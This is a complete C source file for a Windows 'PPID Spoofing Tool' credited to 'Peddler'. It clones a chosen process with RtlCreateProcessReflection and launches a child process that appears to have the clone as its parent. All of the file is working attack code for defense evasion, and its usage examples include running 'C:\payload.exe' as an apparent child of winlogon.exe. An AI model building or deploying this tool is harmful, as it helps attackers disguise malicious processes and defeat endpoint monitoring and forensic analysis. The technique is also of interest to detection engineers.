/* Author: Peddler */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winternl.h>

typedef struct _RTL_PROCESS_REFLECTION_INFORMATION {
    HANDLE ReflectionProcessHandle;
    HANDLE ReflectionThreadHandle;
    CLIENT_ID ReflectionClientId;
} RTL_PROCESS_REFLECTION_INFORMATION, *PRTL_PROCESS_REFLECTION_INFORMATION;

typedef NTSTATUS(NTAPI* pfnRtlCreateProcessReflection)(
    HANDLE ProcessHandle,
    ULONG Flags,
    PVOID StartRoutine,
    PVOID StartContext,
    HANDLE EventHandle,
    PRTL_PROCESS_REFLECTION_INFORMATION ReflectionInformation
);

DWORD GetProcessIdByName(const wchar_t* processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        wprintf(L"[-] Failed to create process snapshot. Error: %lu\n", GetLastError());
        return 0;
    }

    PROCESSENTRY32W pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return pid;
}

BOOL PPIDSpoofing_RtlCreateProcessReflection(
    const wchar_t* targetProcessName,
    const wchar_t* childProcess,
    const wchar_t* childArgs
) {
    wprintf(L"\n========================================================\n");
    wprintf(L"   PPID Spoofing via RtlCreateProcessReflection\n");
    wprintf(L"========================================================\n");
    wprintf(L"[*] Target Parent: %s\n", targetProcessName);
    wprintf(L"[*] Child Process: %s\n", childProcess);
    wprintf(L"========================================================\n\n");

    wprintf(L"[STEP 1/6] Loading ntdll.dll...\n");
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        wprintf(L"[-] FAILED: Cannot get ntdll.dll handle. Error: %lu\n", GetLastError());
        return FALSE;
    }
    wprintf(L"[+] SUCCESS: ntdll.dll loaded at: 0x%p\n\n", hNtdll);

    wprintf(L"[STEP 2/6] Resolving RtlCreateProcessReflection function pointer...\n");
    pfnRtlCreateProcessReflection RtlCreateProcessReflection = 
        (pfnRtlCreateProcessReflection)GetProcAddress(hNtdll, "RtlCreateProcessReflection");
    
    if (!RtlCreateProcessReflection) {
        wprintf(L"[-] FAILED: RtlCreateProcessReflection not found\n");
        wprintf(L"[-] Requires Windows 10 version 1703 or later\n");
        return FALSE;
    }
    wprintf(L"[+] SUCCESS: Function pointer resolved at: 0x%p\n\n", RtlCreateProcessReflection);

    wprintf(L"[STEP 3/6] Finding target process: %s\n", targetProcessName);
    DWORD targetPid = GetProcessIdByName(targetProcessName);
    if (targetPid == 0) {
        wprintf(L"[-] FAILED: Target process not found: %s\n", targetProcessName);
        return FALSE;
    }
    wprintf(L"[+] SUCCESS: Target process found - PID: %lu\n", targetPid);
    wprintf(L"[*] Opening handle to target process (PROCESS_ALL_ACCESS)...\n");
    HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hTargetProcess) {
        wprintf(L"[-] FAILED: Cannot open target process. Error: %lu\n", GetLastError());
        return FALSE;
    }
    wprintf(L"[+] SUCCESS: Target process handle opened (Handle: 0x%p)\n\n", hTargetProcess);

    wprintf(L"[STEP 4/6] Calling RtlCreateProcessReflection to clone process...\n");
    wprintf(L"[*] Parameters:\n");
    wprintf(L"    - ProcessHandle: 0x%p\n", hTargetProcess);
    wprintf(L"    - Flags: 0x%08X\n", 0);
    wprintf(L"    - StartRoutine: NULL\n");
    wprintf(L"    - StartContext: NULL\n");
    wprintf(L"    - EventHandle: NULL\n");
    wprintf(L"[*] Executing RtlCreateProcessReflection...\n");
    
    RTL_PROCESS_REFLECTION_INFORMATION reflectionInfo = { 0 };
    
    NTSTATUS status = RtlCreateProcessReflection(
        hTargetProcess,
        0,
        NULL,
        NULL,
        NULL,
        &reflectionInfo
    );

    wprintf(L"[*] Closing original process handle...\n");
    CloseHandle(hTargetProcess);

    if (status != 0) {
        wprintf(L"[-] FAILED: RtlCreateProcessReflection returned NTSTATUS: 0x%08lX\n", status);
        return FALSE;
    }

    DWORD clonedPid = GetProcessId(reflectionInfo.ReflectionProcessHandle);
    wprintf(L"[+] SUCCESS: Process cloned/reflected!\n");
    wprintf(L"[+] Reflection Information:\n");
    wprintf(L"    - Cloned Process Handle: 0x%p\n", reflectionInfo.ReflectionProcessHandle);
    wprintf(L"    - Cloned Thread Handle: 0x%p\n", reflectionInfo.ReflectionThreadHandle);
    wprintf(L"    - Cloned Process PID: %lu\n", clonedPid);
    wprintf(L"    - Cloned Thread TID: %llu\n\n", (ULONGLONG)(ULONG_PTR)reflectionInfo.ReflectionClientId.UniqueThread);

    wprintf(L"[STEP 5/6] Setting up STARTUPINFOEX with parent process attribute...\n");
    
    STARTUPINFOEXW siEx = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attributeListSize = 0;

    siEx.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    wprintf(L"[*] Initializing STARTUPINFOEXW structure...\n");

    wprintf(L"[*] Getting attribute list size...\n");
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeListSize);
    wprintf(L"[+] Required attribute list size: %Iu bytes\n", attributeListSize);
    wprintf(L"[*] Allocating attribute list memory...\n");
    siEx.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(), 
        HEAP_ZERO_MEMORY, 
        attributeListSize
    );
    
    if (!siEx.lpAttributeList) {
        wprintf(L"[-] FAILED: Cannot allocate attribute list\n");
        CloseHandle(reflectionInfo.ReflectionProcessHandle);
        CloseHandle(reflectionInfo.ReflectionThreadHandle);
        return FALSE;
    }
    wprintf(L"[+] Attribute list allocated at: 0x%p\n", siEx.lpAttributeList);

    wprintf(L"[*] Initializing attribute list...\n");
    if (!InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, &attributeListSize)) {
        wprintf(L"[-] FAILED: InitializeProcThreadAttributeList. Error: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
        CloseHandle(reflectionInfo.ReflectionProcessHandle);
        CloseHandle(reflectionInfo.ReflectionThreadHandle);
        return FALSE;
    }
    wprintf(L"[+] Attribute list initialized\n");

    wprintf(L"[*] Updating PROC_THREAD_ATTRIBUTE_PARENT_PROCESS...\n");
    wprintf(L"[*] Setting spoofed parent to: 0x%p (cloned process)\n", reflectionInfo.ReflectionProcessHandle);
    if (!UpdateProcThreadAttribute(
        siEx.lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &reflectionInfo.ReflectionProcessHandle,
        sizeof(HANDLE),
        NULL,
        NULL
    )) {
        wprintf(L"[-] Failed to update parent process attribute. Error: %lu\n", GetLastError());
        DeleteProcThreadAttributeList(siEx.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
        CloseHandle(reflectionInfo.ReflectionProcessHandle);
        CloseHandle(reflectionInfo.ReflectionThreadHandle);
        return FALSE;
    }

    wprintf(L"[+] SUCCESS: PPID attribute set to cloned process\n\n");

    wprintf(L"[STEP 6/6] Creating child process with spoofed parent...\n");
    wchar_t commandLine[MAX_PATH * 2] = { 0 };
    if (childArgs && wcslen(childArgs) > 0) {
        swprintf_s(commandLine, MAX_PATH * 2, L"\"%s\" %s", childProcess, childArgs);
    } else {
        swprintf_s(commandLine, MAX_PATH * 2, L"\"%s\"", childProcess);
    }

    wprintf(L"[*] Command line: %s\n", commandLine);
    wprintf(L"[*] Flags: EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE\n");
    wprintf(L"[*] Calling CreateProcessW...\n");

    BOOL success = CreateProcessW(
        NULL,
        commandLine,
        NULL,
        NULL,
        FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &siEx.StartupInfo,
        &pi
    );

    wprintf(L"[*] Cleaning up attribute list...\n");
    DeleteProcThreadAttributeList(siEx.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
    wprintf(L"[+] Attribute list cleaned up\n");

    if (!success) {
        wprintf(L"[-] FAILED: CreateProcessW failed. Error: %lu\n", GetLastError());
        CloseHandle(reflectionInfo.ReflectionProcessHandle);
        CloseHandle(reflectionInfo.ReflectionThreadHandle);
        return FALSE;
    }

    wprintf(L"[+] SUCCESS: Child process created with spoofed PPID!\n");
    wprintf(L"\n");
    wprintf(L"========================================================\n");
    wprintf(L"               OPERATION COMPLETE\n");
    wprintf(L"========================================================\n");
    wprintf(L"Process Information:\n");
    wprintf(L"  Child Process PID:  %lu\n", pi.dwProcessId);
    wprintf(L"  Child Thread TID:   %lu\n", pi.dwThreadId);
    wprintf(L"  Spoofed Parent PID: %lu (cloned %s)\n", clonedPid, targetProcessName);
    wprintf(L"  Real Parent PID:    %lu (this program)\n", GetCurrentProcessId());
    wprintf(L"========================================================\n");
    wprintf(L"Verification Steps:\n");
    wprintf(L"  1. Open Process Hacker or Task Manager\n");
    wprintf(L"  2. Find Process PID: %lu\n", pi.dwProcessId);
    wprintf(L"  3. Check Parent - Should show: %s (PID: %lu)\n", targetProcessName, clonedPid);
    wprintf(L"  4. Verify PPID spoofing is working!\n");
    wprintf(L"========================================================\n\n");

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(reflectionInfo.ReflectionProcessHandle);
    CloseHandle(reflectionInfo.ReflectionThreadHandle);

    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {
    wprintf(L"\n╔══════════════════════════════════════════════════════╗\n");
    wprintf(L"║          PPID Spoofing Tool - Peddler               ║\n");
    wprintf(L"║   Using RtlCreateProcessReflection Function Ptr     ║\n");
    wprintf(L"╚══════════════════════════════════════════════════════╝\n\n");

    if (argc < 3) {
        wprintf(L"Usage: %s <target_parent> <child_process> [args]\n\n", argv[0]);
        wprintf(L"Arguments:\n");
        wprintf(L"  target_parent  - Process name to spoof as parent\n");
        wprintf(L"  child_process  - Full path to process to launch\n");
        wprintf(L"  args           - Optional arguments\n\n");
        wprintf(L"Examples:\n");
        wprintf(L"  %s explorer.exe C:\\Windows\\System32\\notepad.exe\n", argv[0]);
        wprintf(L"  %s svchost.exe C:\\Windows\\System32\\cmd.exe\n", argv[0]);
        wprintf(L"  %s winlogon.exe C:\\payload.exe\n\n", argv[0]);
        return 1;
    }

    BOOL result = PPIDSpoofing_RtlCreateProcessReflection(argv[1], argv[2], (argc >= 4) ? argv[3] : NULL);

    return result ? 0 : 1;
}
